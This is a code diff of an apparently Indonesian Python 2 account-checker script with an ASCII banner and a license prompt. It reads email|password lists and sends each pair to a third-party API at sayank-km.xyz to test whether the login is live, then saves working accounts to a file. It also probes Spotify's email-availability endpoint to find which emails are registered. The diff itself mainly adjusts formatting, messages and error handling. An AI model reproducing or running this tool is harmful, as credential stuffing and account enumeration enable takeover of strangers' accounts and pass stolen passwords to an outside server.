@@ -13,12 +13,12 @@ from colorama import Fore, Back, Style
 merah = "\033[01;31m{0}\033[00m"
 hijau = "\033[01;35m{0}\033[00m"
 
-w = merah.format(" _   ___                  _   _     \n")
-gans = merah.format("| | / (_)                | | | |    \n")
-sangat = merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  \n")
+w 		= merah.format(" _   ___                  _   _     \n")
+gans 	= merah.format("| | / (_)                | | | |    \n")
+sangat 	= merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  \n")
 kirnath = merah.format("|    \| | '__| '_ \ / _` | __| '_ \ \n")
-coded = merah.format("| |\  \ | |  | | | | (_| | |_| | | |\n")
-me = merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n")
+coded 	= merah.format("| |\  \ | |  | | | | (_| | |_| | | |\n")
+me 		= merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n")
 exit = "[========]"
 for l in w:
 	sys.stdout.write(l)
@@ -47,13 +47,21 @@ def acc():
 	input_license = str(raw_input("License?: "))
 	if input_license != license:
 		try:
-			print "License Not Valid !"
-			
+			bye = "G O O D B Y E ... :) \n"
+			print "[+] License Not Valid !"
+			print "[+] Exiting...."
+			time.sleep(1)
+			for i in bye:
+				sys.stdout.write(i)
+				sys.stdout.flush()
+				time.sleep(0.3)
 			sys.exit(1)
 			
 		except TypeError:
 			print "Exiting......"
 	else:
+		print "[+] Valditaing License..."
+		time.sleep(2)
 		print "[+] License is Valid !"
 		time.sleep(2)
 		print "[+] Starting......."
@@ -68,14 +76,17 @@ def acc():
 		readfile = open(emaillist, "r")
 		done = hijau.format("[+] Done! Result was Saved as Account.txt")
 		for line in readfile:
-			data = line.split("|")
-			a = data[0]
-			b = data[1]
-			
-			respon = urllib2.urlopen("http://sayank-km.xyz/api/?email={}&pass={}".format(a,b), timeout=360)
-			reason = respon.read()
-			resp = json.loads(reason)
-			data_b = (b).replace("\n", "")
+			data 	= line.split("|")
+			a 		= data[0]
+			b 		= data[1]
+			try:
+				respon 	= urllib2.urlopen("http://sayank-km.xyz/api/?email={}&pass={}".format(a,b), timeout=3600)
+				reason 	= respon.read()
+				resp 	= json.loads(reason)
+				data_b 	= (b).replace("\n", "")
+			except urllib2.URLError as e:
+				e.reason = "API Server Down!"
+				raise e
 			if "success" not in reason:
 				print (Fore.RED + "DIE ==>"),a,"|",data_b
 				
@@ -91,22 +102,22 @@ def acc():
 		print done
 def email():
 	try:
-		emaillist = str(raw_input("Enter List File: "))
+		emaillist	= str(raw_input("Enter List File: "))
 	except FileNotFoundError as e:
-		error = merah.format("Exiting......\n")
+		error		= merah.format("Exiting......\n")
 		for l in error:
 			sys.stdout.write(l)
 			sys.stdout.flush()
 			time.sleep(0.2)
 			print error
 	else:
-		readfile = open(emaillist, "r")
+		readfile 	= open(emaillist, "r")
 		for line in readfile:
-			data = line.split("\n")
-			a = data[0]
+			data 	= line.split("\n")
+			a 		= data[0]
 			quote_email = urllib.quote(a)
-			respon = urllib2.urlopen("https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email={}".format(quote_email))
-			reason = respon.read()
+			respon 	= urllib2.urlopen("https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email={}".format(quote_email))
+			reason 	= respon.read()
 			if "false" not in reason:
 				print (Fore.RED + "DIE ==>"),a
 			else:
